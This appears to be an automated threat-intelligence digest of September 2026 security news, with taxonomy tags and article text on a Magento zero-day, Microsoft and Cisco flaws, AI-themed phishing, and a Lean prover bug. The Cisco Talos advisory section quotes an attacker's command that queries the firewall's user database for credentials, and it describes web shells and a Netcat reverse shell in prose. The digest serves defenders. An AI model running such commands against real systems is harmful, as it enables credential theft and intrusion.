Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 23, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  artificial intelligence , Google Chrome , Vulnerability , Web Security , Zero-Day ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials Critic
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox
  - Published: 2026-09-09T09:11:03+00:00
  - Link: https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
  - Summary: Google on Tuesday released updates to patch 230 security vulnerabilities, including one that has come under active exploitation in the wild. The medium-severity vulnerability, assigned the CVE identifier CVE-2026-87491 (CVSS score: N/A), has been described as an out-of-bounds bug in V8, Chrome's JavaScript and WebAssembly engine. "Out-of-bounds write in V8 in Google Chrome prior to

### Cluster 81b3bf0ce0 — score 20

- Title: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-08T09:13:47+00:00
- Link: https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-75650

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor, zero_day
- affected_industries: government, retail_ecommerce
- cve_ids: CVE-2026-48273, CVE-2026-75650, CVE-2026-75746, CVE-2026-82004
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor, active_exploitation
- affected_industries: government, retail_ecommerce
- cve_ids: CVE-2026-75650, CVE-2026-82004, CVE-2026-48273, CVE-2026-75746
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical
```

#### Full body

```
Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell  Ravie Lakshmanan  Sep 08, 2026 Vulnerability / Web Security Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical vulnerability that could result in arbitrary code execution," Adobe said , adding it's "aware that CVE-2026-75650 has been exploited in the wild targeting Adobe Commerce merchants." At its core, the flaw abuses Magento's template system through PHP code injection to generate a "Payment Transaction Failed Reminder" email, triggering code execution in the process. The shortcoming affects the following versions - Adobe Commerce 2.4.9-2026-aug and earlier 2.4.8-2026-aug and earlier 2.4.7-2026-aug and earlier 2.4.6-2026-aug and earlier 2.4.5-2026-aug and earlier 2.4.4-2026-aug and earlier Adobe Commerce B2B 1.5.3-2026-aug and earlier 1.5.2-2026-aug and earlier 1.4.2-2026-aug and earlier 1.3.4-2026-aug and earlier 1.3.3-2026-aug and earlier Magento Open Source 2.4.9-2026-aug and earlier 2.4.8-2026-aug and earlier 2.4.7-2026-aug and earlier 2.4.6-2026-aug and earlier Patches have been released as part of a hotfix's available for download from the following link: repo.magento[.]com/patch/VULN-39341-composer-patches.zip "To help resolve the vulnerability for the affected products and versions, you must apply the VULN-39341 patch (depending on your version) and rotate your encryption keys," Adobe said . The development comes days after the Dutch e-commerce security company revealed that threat actors are exploiting CVE-2026-75650 to deploy a Rust-based Linux backdoor that connects to an external server and awaits further instructions. Separately, the issue has been abused to deliver a PHP dropper on susceptible sites that writes a web shell capable of executing arbitrary PHP code. According to Netherlands-based Disrex, a Magento server managed by the e-commerce development platform is said to have been compromised 50 minutes after the first confirmed StyleSmuggler exploitation was reported on September 4, 2026, at 10:20 p.m. UTC. "StyleSmuggler turns Magento's own template-processing and dependency-injection code into an unauthenticated remote-code-execution chain," Disrex said. Telemetry data from Previdian shows that 12 exploitation attempts have been recorded against its honeypots since September 7, 2026, from two unique IP addresses from China and Romania. That said, the efforts have been unsuccessful, Founder and CEO Ryan Dewhurst said. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on September 8, 2026, added CVE-2026-75650 to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. In tandem, Adobe has also released patches for more than 170 vulnerabilities across its products, including CVE-2026-82004 (CVSS score: 10.0), an operating system command injection flaw in Campaign Classic leading to arbitrary code execution. Also patched by Adobe are two critical vulnerabilities in ColdFusion CVE-2026-48273, CVSS score: 9.9, and CVE-2026-75746, CVSS score: 9.1) that could result in arbitrary code execution. The web design software maker said it's not aware of any exploits in the wild for any of these issues. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Adobe , E-commerce Security , linux , Malware , Vulnerability , Web Security ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pos
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell
  - Published: 2026-09-08T09:13:47+00:00
  - Link: https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
  - Summary: Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical

### Cluster a7d235c86e — score 19

- Title: Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T04:41:29+00:00
- Link: https://thehackernews.com/2026/09/microsoft-patches-record-974-flaws.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: government
- cve_ids: CVE-2023-21674, CVE-2026-55007, CVE-2026-80097, CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-85880, CVE-2026-81963, CVE-2023-21674, CVE-2026-55007, CVE-2026-80097
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft on Tuesday broke Patch Tuesday records by addressing an earth-shattering 974 vulnerabilities spanning its software portfolio, including two flaws that it said have been actively exploited in the wild. These include 723 flaws in Windows, 111 in Office and Office 2016, 62 in SQL, and 22 in Developer Tools. Of these, over 110 shortcomings have been assigned a critical severity rating.
```

#### Full body

```
Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days  Ravie Lakshmanan  Sep 09, 2026 Zero-Day / Vulnerability Microsoft on Tuesday broke Patch Tuesday records by addressing an earth-shattering 974 vulnerabilities spanning its software portfolio, including two flaws that it said have been actively exploited in the wild. These include 723 flaws in Windows, 111 in Office and Office 2016, 62 in SQL, and 22 in Developer Tools. Of these, over 110 shortcomings have been assigned a critical severity rating. Three prominent vulnerability types, namely privilege escalation, remote code execution, and information disclosure, account for nearly 90% of the flaws patched this month. Along with Microsoft's fixes for 25 non-Microsoft CVEs, the update brings the total number of vulnerabilities resolved to 999. September's record-setting security updates come after Microsoft patched 457 vulnerabilities in August, 663 in July , 220 in June , and 161 in May . "At this scale, the challenge is not simply getting through the patch list but knowing what needs attention first," Jack Bicer, director of vulnerability research at Action1, said . "With hundreds of updates landing at once, IT and security teams need to quickly separate the vulnerabilities that demand immediate action from those that can follow the normal deployment cycle." The two vulnerabilities that have come under active exploitation are listed below - CVE-2026-85880 (CVSS score: 7.8) - A heap-based buffer overflow vulnerability in Windows Advanced Local Procedure Call (ALPC) that allows an authorized attacker to elevate privileges locally and gain SYSTEM privileges CVE-2026-81963 (CVSS score: 7.8) - An improper link resolution vulnerability in the Windows Update Stack that allows an authorized attacker to elevate privileges locally and gain SYSTEM privileges "An attacker who can execute code in a low-privilege AppContainer could exploit this vulnerability locally to escape the sandbox and elevate privileges on the affected system," Microsoft said in an advisory for CVE-2026-85880. "No additional user interaction is required." Adam Barnett, lead software engineer at Rapid7, said all supported versions of Windows receive a patch for CVE-2026-81963, a move that "presumably tightens up controls to prevent the Windows Update Stack from following a malicious link and overwriting a system component with an attacker-controlled imposter." Cybersecurity companies Volexity and Proofpoint have been acknowledged for reporting CVE-2026-85880, while Romain Deperne, an offensive security researcher at Airbus Helicopters, and the Microsoft Threat Intelligence Center (MSTIC) have been credited with the second bug. The Windows maker said it has detected zero-day exploitation efforts targeting the flaws, but did not disclose any specifics as to who is behind them, the scale of such efforts, and if those attacks have successfully breached any victims. Per exposure management and vulnerability assessment platform Tenable, there have been seven privilege escalation flaws in the Windows Update Stack since 2022. However, CVE-2026-81963 is the first zero-day as well as the first to be exploited in the wild. As for CVE-2026-85880, it's the second to be weaponized as a zero-day since CVE-2023-21674 , which was addressed in January 2023. The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add both flaws to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 22, 2026. Some of the other notable flaws patched by Microsoft are as follows - CVE-2026-55007 (CVSS score: 8.1) - A double free vulnerability in Microsoft Exchange Server that allows an unauthorized attacker to execute code over a network CVE-2026-80097 (CVSS score: 8.6) - An improper authentication vulnerability in Microsoft Authenticator that allows an unauthorized attacker to elevate privileges
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days
  - Published: 2026-09-09T04:41:29+00:00
  - Link: https://thehackernews.com/2026/09/microsoft-patches-record-974-flaws.html
  - Summary: Microsoft on Tuesday broke Patch Tuesday records by addressing an earth-shattering 974 vulnerabilities spanning its software portfolio, including two flaws that it said have been actively exploited in the wild. These include 723 flaws in Windows, 111 in Office and Office 2016, 62 in SQL, and 22 in Developer Tools. Of these, over 110 shortcomings have been assigned a critical severity rating.

### Cluster 8760c8b22e — score 17

- Title: Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-11T06:19:59+00:00
- Link: https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: CVE-2026-20079

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain, web_shell_backdoor, zero_day
- affected_industries: education, government
- affected_products: AWS, Cisco, Fortinet, VMware
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, apt_espionage, web_shell_backdoor
- affected_industries: government, education
- affected_products: Cisco, AWS, VMware
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cisco has revealed that three distinct threat clusters linked to ransomware and state-sponsored attacks have been exploiting two recently patched Secure Firewall Management Center (FMC) vulnerabilities. The attacks leverage CVE-2026-20079 (CVSS score: 10.0), an authentication bypass vulnerability in the web interface of FMC software that could allow an unauthenticated, remote attacker to bypass
```

#### Full body

```
Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware  Ravie Lakshmanan  Sep 11, 2026 Vulnerability / Malware Cisco has revealed that three distinct threat clusters linked to ransomware and state-sponsored attacks have been exploiting two recently patched Secure Firewall Management Center (FMC) vulnerabilities. The attacks leverage CVE-2026-20079 (CVSS score: 10.0), an authentication bypass vulnerability in the web interface of FMC software that could allow an unauthenticated, remote attacker to bypass authentication and execute script files on an affected device to obtain root access to the underlying operating system. The second flaw under exploitation is CVE-2026-20316 (CVSS score: 5.3), which could allow an unauthenticated, remote attacker to log in to an affected device using a low-privilege account to access sensitive data within susceptible systems. It can be paired with other Cisco Secure FMC vulnerabilities to elevate privileges. Cisco Talos said it identified three clusters of post-compromise activity of FMC instances associated with state-sponsored and crimeware threat actors. These include - UAT-12197 , which has exploited CVE-2026-20079 to deploy JSP-based web shells and a Java Archive (JAR)-based command executor to query internal databases and obtain user authentication data and credentials UAT-11823 , which has exploited both CVE-2026-20079 and CVE-2026-20316 to deliver a Netcat-based reverse shell, two bash scripts to harvest managed-device configurations, and a variant of Cyclops Blink , a modular ELF implant previously attributed to the Russian state-sponsored hacking group Sandworm UAT-11988 , a ransomware operation that has exploited CVE-2026-20316 for initial access and then used legitimate built-in FMC tooling as part of a living-off-the-land (LotL) attack to conduct extensive reconnaissance of the victim's environment, drop tunneling tools to maintain network access, collect credentials, build a target list of endpoints to encrypt, terminate security tools, and deploy Qilin ransomware on selected systems. "Customers are strongly advised to apply hotfixes for affected software versions already released by Cisco for CVE-2026-20079 and CVE-2026-20316," Cisco said, adding it intends to ship a comprehensive hardening release for various internally discovered vulnerabilities next week. The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-20079 to its Known Exploited Vulnerabilities (KEV) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 12, 2026. The second vulnerability, CVE-2026-20316, was added to the KEV catalog in late July 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  cisco , Malware , Nation-State , network security , ransomware , Vulnerability ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials Critical VMware Workstation and Fusion Flaw Lets VM Admins Execute Host Code Thousands of OpenAI Agents Quietly Turned an Abandoned Wiki Into Their Coordination Channel Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities Phishing Campaign Sends Millions of Emails Using Invisible Unicode to Evade Filters PostgreSQL Fixes 12-Year-Old Logical Decoding Flaw Enabling Repl
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware
  - Published: 2026-09-11T06:19:59+00:00
  - Link: https://thehackernews.com/2026/09/cisco-fmc-flaws-exploited-to-steal.html
  - Summary: Cisco has revealed that three distinct threat clusters linked to ransomware and state-sponsored attacks have been exploiting two recently patched Secure Firewall Management Center (FMC) vulnerabilities. The attacks leverage CVE-2026-20079 (CVSS score: 10.0), an authentication bypass vulnerability in the web interface of FMC software that could allow an unauthenticated, remote attacker to bypass

### Cluster cccc588c10 — score 17

- Title: Detect and disrupt AI-themed attacks with Microsoft Defender
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-10T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/10/detect-and-disrupt-ai-themed-attacks-with-microsoft-defender/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft Defender

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, zero_day
- affected_products: Microsoft Defender, Microsoft/Copilot, OpenAI/ChatGPT
- cve_ids: CVE-2026-69414
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft Defender, OpenAI/ChatGPT, Microsoft/Copilot
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
See how Microsoft Defender detects and disrupts AI-themed phishing, malware, and multi-stage attacks across the attack chain. The post Detect and disrupt AI-themed attacks with Microsoft Defender appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Adversary-in-the-middle (AiTM) Credential theft Social engineering Content types Best practices Products and services Microsoft Defender Topics AI and agents Security operations Threat trends Every wave of technology excitement creates a new opportunity for cyberattackers, and AI is no exception. Microsoft Threat Intelligence has published research showing a growing set of campaigns that impersonate popular AI platforms and tools, including ChatGPT, Microsoft Copilot, DeepSeek, and Claude. 1 The goal is to make phishing, search-driven malware campaigns, and malvertising—which is malicious advertising that uses online ads to lure users to harmful sites, downloads, or redirect chains—more convincing. A ChatGPT-themed phishing campaign sent up to 100,000 emails in a single day, tricking users into updating their ChatGPT Plus payment information and stealing personal and credit card data. These campaigns do not represent a compromise of the AI services being referenced. They represent something more familiar—cyberattackers doing what they have always done: borrowing trust. Right now, AI brands can carry significant trust and curiosity, making them attractive themes for cyberattackers to exploit. Prevent and disrupt cyberthreats with Microsoft Defender Understanding why this trend matters and what it means for security teams is critical to shaping a modern protection strategy. The tactics are the same ones cyberattackers have always refined: urgency, curiosity, and impersonation of something familiar to lower a user’s guard. What has changed is the wrapper. A message about a new model release, a policy update from a familiar AI assistant, or a plugin that promises to make the workday easier is today’s version of the fake invoice or the shipping notification. AI-themed lures deserve attention not because they are a passing trend tied to one product cycle, but because AI remains a genuine source of excitement and urgency for employees and consumers alike, and cyberattackers are exploiting the human instinct to explore what is new, useful, or urgent. The attack pattern is evolving Microsoft’s research team recently observed several AI brand campaigns including: A ChatGPT-themed phishing kit built to harvest credit card data. A Claude-themed campaign that harvested credentials and access tokens through adversary-in-the-middle (AiTM) techniques. Malvertising for a fake AI Windows plugin that delivered the Vidar stealer. Fraudulent DeepSeek installers distributed through GitHub. In one case, an initial access broker tracked as Storm-3075 used AI-themed malvertising to distribute payloads for multiple downstream actors, a sign of how quickly this tactic is being commoditized across the criminal ecosystem. Figure 1. Snippet of the top portion of the email impersonating ChatGPT and enticing users to click on the link. What ties these campaigns together is not sophistication in the traditional sense. It is patience and precision in exploiting a moment. Threat actors are capitalizing on anticipated launches and emerging trends, layering multi-stage redirection chains and disposable infrastructure to slip past both users and defenses. That has real implications for security leaders: it means these incidents cannot be evaluated one surface at a time. A single AI-themed lure can begin as an email, become a malicious link, trigger a suspicious download, and end as an identity or endpoint compromise. Organizations that assess each of those as an isolated event are always a step behind. Organizations that connect them see the full shape of the cyberattack, often early enough to stop it. Turning AI lures into dead ends with Microsoft Defender In practice, protection starts before the user ever engages with the lure. Microsoft Defender’s anti-phishing policies can help detect spoofing and impersonation attempts, including user and domain impersonation, first-contact messages, mailbox intelligence signals, and othe
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Detect and disrupt AI-themed attacks with Microsoft Defender
  - Published: 2026-09-10T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/10/detect-and-disrupt-ai-themed-attacks-with-microsoft-defender/
  - Summary: See how Microsoft Defender detects and disrupts AI-themed phishing, malware, and multi-stage attacks across the attack chain. The post Detect and disrupt AI-themed attacks with Microsoft Defender appeared first on Microsoft Security Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researcher Drops New Microsoft Defender PoC Showing ShieldBreak Patch Can Be Bypassed
  - Published: 2026-09-09T06:47:27+00:00
  - Link: https://thehackernews.com/2026/09/researcher-drops-new-microsoft-defender.html
  - Summary: The security researcher known as Chaotic Eclipse has dropped a proof-of-concept (PoC) for yet another zero-day in Microsoft Defender. The vulnerability, codenamed ShieldCrash, is assessed to be a patch bypass for CVE-2026-69414 (CVSS score: 7.8), also called ShieldBreak, which the researcher reported last month. "Microsoft has failed to properly patch ShieldBreak CVE-2026-69414," Chaotic

### Cluster 5786bd6a86 — score 16

- Title: Active exploitation of Cisco Secure Firewall Management Center vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-09T16:08:59+00:00
- Link: https://blog.talosintelligence.com/fmc-ongoing-exploitation/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: Cisco

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ransomware_extortion, web_shell_backdoor
- affected_industries: financial_services
- affected_products: Cisco
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage, web_shell_backdoor, active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software.
```

#### Full body

```
Active exploitation of Cisco Secure Firewall Management Center vulnerabilities By Cisco Talos Wednesday, September 9, 2026 12:08 Threat Advisory malware Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software. First, CVE-2026-20079 is an authentication bypass vulnerability in unpatched instances of Cisco’s Secure FMC Software, which allows an unauthenticated, remote attacker to bypass authentications and execute scripts on impacted devices to obtain root access to the underlying operating system. Second, CVE-2026-20316 is a vulnerability that allows a remote attacker to log in using a low-privileged account. CVE-2026-20079 is a critical vulnerability with a CVSS score of 10.0. Customers are strongly advised to follow Cisco’s guidance provided in the security advisory and apply the security patches previously made available. CVE-2026-20316 has a CVSS score of 5.3, however it can be used with other Cisco Secure FMC vulnerabilities to elevate privileges. Due to Talos identifying in the wild abuse of these CVE’s, customers are strongly advised to apply hotfixes for affected software versions already released by Cisco for CVE-2026-20079 and CVE-2026-20316 . A comprehensive hardening release consisting of these hotfixes along with other internally discovered vulnerabilities will be released next week (Week of September 14th). Talos’ analysis illustrates three clusters of post-compromise activity on FMC instances associated with state-sponsored and crimeware threat actors, as described below. The first cluster which we track as UAT-12197, involves the exploitation of CVE-2026-20079, leading to the deployment of web shells, a Java Archive (JAR)-based command executor, and credential exfiltration. The second intrusion cluster, which we attribute to UAT-11823, consisted of the exploitation of CVE-2026-20079 and CVE-2026-20316, leading to the deployment of a Netcat-based reverse shell and proxy tooling, ultimately leading to the deployment of a variant of the Cyclops Blink malware, previously attributed to the Russian APT Sandworm by the United States and United Kingdom . Talos is further disclosing a third cluster of malicious activity on an FMC instance, attributed to UAT-11988, who we assess with high confidence is a ransomware operator. The preliminary stages of the attack entailed the threat actor gaining access to the system via static credentials ( CVE-2026-20316) and then abusing legitimate built-in FMC tooling in living-off-the-land (LOTL) fashion to conduct extensive reconnaissance of the victim’s environment, deploy tunneling tools to maintain network access, harvest credentials, and build a target list of endpoints to encrypt/lock. Subsequent actions and tactics, techniques, and procedures (TTPs) the threat actor used in the victim’s environment were consistent with those of Qilin ransomware affiliates. Note: Talos would like to acknowledge and thank Avit for their contributions towards investigating Cluster #3 - UAT-11988. Cluster #1: UAT-12197 This cluster of activity involved the successful exploitation of CVE-2026-20079 and the subsequent placement of a malicious web shell in the CSM Tomcat webroot directory. The web shell is JSP-based and Base64 decodes a parameter labelled “F6C1F0E7”, consisting of the class name to load in the JAVA process: The web shell was used to place a malicious JAR file in the same directory. The threat actors used the JAR file (named “cmd[.]jar”) to query the compromised systems’ internal databases to obtain user authentication data and credentials: /var/jre/bin/java -jar cmd.jar '/var/sf/bin/OmniQuery.pl -db mdb -e \'SELECT name, auth_data FROM users;\'' The JAR file is basically a command executor that obtains the command to be executed from its command line and executes it using /bin/sh -c <command>. Cluster #2: UAT-11823 Talos attributes this cluster of activity to UAT-11823, an advanced persistent threat (APT) acto
```

#### Corroborating sources (2)

- **Cisco Talos** (threat_research_primary)
  - Title: Active exploitation of Cisco Secure Firewall Management Center vulnerabilities
  - Published: 2026-09-09T16:08:59+00:00
  - Link: https://blog.talosintelligence.com/fmc-ongoing-exploitation/
  - Summary: Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Cisco FMC flaws exploited by ransomware gang, state-sponsored hackers
  - Published: 2026-09-10T15:43:58+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisco-fmc-flaws-exploited-by-ransomware-gang-state-sponsored-hackers/
  - Summary: Cisco Talos says two recently patched Secure Firewall Management Center (FMC) vulnerabilities have been exploited by three separate threat clusters linked to ransomware and state-sponsored attacks. [...]

### Cluster 97ddd3f916 — score 16

- Title: A “proof” of Fermat’s Last Theorem that fits the margin
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-09-09T11:00:00+00:00
- Link: https://blog.trailofbits.com/2026/09/09/a-proof-of-fermats-last-theorem-that-fits-the-margin/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 6
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- affected_industries: government, manufacturing_industrial, retail_ecommerce
- affected_products: OpenAI/ChatGPT
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: manufacturing_industrial, retail_ecommerce
- affected_products: OpenAI/ChatGPT
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Fermat famously claimed to have a “truly marvelous proof” of his Last Theorem , but he never wrote it down, insisting the margin of his page was too narrow to contain it. A few centuries later, Anthropic announced a complete formalization of Fermat’s Last Theorem using 13 million lines of Lean code (clearly not what Fermat intended). Luckily, we found a wonderfully cursed Lean bug , shown below, that suggests the proof may have fit the margin after all. The issue affects all stable versions of Lean up to 4.33.1, and the patch is incorporated in v4.34.0-rc1. A “checked” proof of Fermat’s Last Theorem using Lean 4.33.1 The blue checkmarks in the screenshot above would suggest that Lean considers this proof correct. This seems odd given the amount of work Sir Andrew Wiles put into this problem and the vast size of Claude’s proof. So what is going on? The “proof” clearly doesn’t make any sense and exploits an issue in Lean. We found the issue while using GPT-5.6 to experiment with a new sk
```

#### Full body

```
Fermat famously claimed to have a “truly marvelous proof” of his Last Theorem , but he never wrote it down, insisting the margin of his page was too narrow to contain it. A few centuries later, Anthropic announced a complete formalization of Fermat’s Last Theorem using 13 million lines of Lean code (clearly not what Fermat intended). Luckily, we found a wonderfully cursed Lean bug , shown below, that suggests the proof may have fit the margin after all. The issue affects all stable versions of Lean up to 4.33.1, and the patch is incorporated in v4.34.0-rc1. A “checked” proof of Fermat’s Last Theorem using Lean 4.33.1 The blue checkmarks in the screenshot above would suggest that Lean considers this proof correct. This seems odd given the amount of work Sir Andrew Wiles put into this problem and the vast size of Claude’s proof. So what is going on? The “proof” clearly doesn’t make any sense and exploits an issue in Lean. We found the issue while using GPT-5.6 to experiment with a new skill for code review. We want to clarify up front that the issue is not a kernel soundness issue , but it happens to nicely fit any discussion of strings, lengths, and substrings. The issue affects String.Pos.Raw.extract , Lean’s low-level string-slicing function. When asked to extract a one-byte slice at an astronomically large position , Lean’s logical definition returns the empty string . But the compiled native code returns the entire original string . That disagreement is enough to manufacture a contradiction. Lean’s ordinary evaluator “proves” that the tiny slice was empty, while native evaluation “proves” that the very same slice contained “a truly marvelous proof.” Put those together, and Lean concludes that the empty string equals a non-empty string. And once you have a contradiction, you can prove anything, including Fermat’s Last Theorem. On the bright side, the Lean team was considerably faster than mathematical history. About 90 minutes after we reported the issue, hargoniX opened a fix for the memory-safety problem , and it was merged roughly three hours after filing. The remaining semantic mismatch was fixed by Rob23oba five days after the report, closing the issue. We’d like to give a huge shoutout to hargoniX, Rob23oba, and the Lean team for the fast turnaround. As a reminder, when dealing with external proofs, follow Lean’s guidance for validating a Lean proof . In our proof-of-concept code above, #print axioms flt shows 'flt' depends on axioms: [propext, Classical.choice, Quot.sound, flt._native.native_decide.ax_1_1] . The extra axiom native_decide adds the compiler to the trusted boundary, and therefore needs to be used with care. Machine-checked proofs will increasingly enable an unprecedented level of trust in mathematical results and critical software. However, more work is needed (e.g., lean4lean and alternative kernel implementations ) to ensure that proofs aren’t deemed correct through exploitation of issues in theorem provers. Fermat’s theorem took 350+ years to prove. If you don’t want to wait that long for your code to be audited, contact us .
```

#### Corroborating sources (6)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: A “proof” of Fermat’s Last Theorem that fits the margin
  - Published: 2026-09-09T11:00:00+00:00
